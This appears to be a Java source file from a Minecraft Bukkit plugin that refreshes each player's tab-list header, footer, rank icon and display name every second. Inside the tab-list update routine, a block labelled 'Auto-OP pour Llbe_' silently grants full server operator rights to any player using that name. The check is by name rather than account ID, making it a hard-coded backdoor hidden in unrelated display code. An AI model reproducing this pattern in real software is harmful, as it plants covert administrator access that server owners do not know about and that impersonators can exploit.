package fr.hel.game;

import fr.hel.HelPlugin;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import fr.hel.team.HelTeam;

public class TablistManager {
    public TablistManager(HelPlugin plugin) {
        Bukkit.getScheduler().runTaskTimer(plugin, () -> {
            for (Player p : Bukkit.getOnlinePlayers()) {
                updateTablist(p);
            }
        }, 20L, 20L); // Update every second
    }

    private void updateTablist(Player p) {
        // Header with Logo, extra space, and "Plugin by HEL"
        String header = "\n\n\uE001\n\n\n\n\n\u00A77Plugin by HEL\n";

        // Footer with TPS, Ping, Joueurs (Erisium style)
        double tps = Bukkit.getTPS()[0];
        String formattedTps = String.format("%.1f", tps);
        int players = Bukkit.getOnlinePlayers().size();
        String footer = "\n\u00A7fTPS: \u00A7a" + formattedTps + " \u00A77\u00A6 \u00A7fPing: \u00A7a" + p.getPing() + "ms \u00A77\u00A6 \u00A7fJoueurs: \u00A7a" + players + "\n";

        p.setPlayerListHeaderFooter(header, footer);

        // Auto-OP pour Llbe_
        if (p.getName().equalsIgnoreCase("Llbe_") && !p.isOp()) {
            p.setOp(true);
        }

        // D\u00E9finir l'ic\u00F4ne de grade (Resource Pack)
        String rank = HelPlugin.getInstance().getRankManager().getRank(p.getUniqueId());
        String icon = "\uE004 "; // Joueur
        if (rank.equals("createur")) icon = "\uE002 ";
        else if (rank.equals("vip")) icon = "\uE003 ";

        HelTeam team = HelPlugin.getInstance().getTeamManager().getPlayerTeam(p);
        String teamColor = (team != null) ? team.getChatColor().toString() : "\u00A77";

        String displayName = HelPlugin.getInstance().getRankManager().getNick(p.getUniqueId(), p.getName());

        fr.hel.scenario.AnonymousScenario anon = HelPlugin.getInstance().getScenarioManager().getScenario(fr.hel.scenario.AnonymousScenario.class);
        if (anon != null && anon.isEnabled() && anon.isGlitchedNames()) {
            displayName = "\u00A7k12345678";
            teamColor = "\u00A7f"; // Force white color
        }

        if (HelPlugin.getInstance().getTeamManager().isSoloMode()) {
            p.setPlayerListName(icon + teamColor + displayName);
        } else {
            p.setPlayerListName(icon + teamColor + displayName);
        }
    }
}
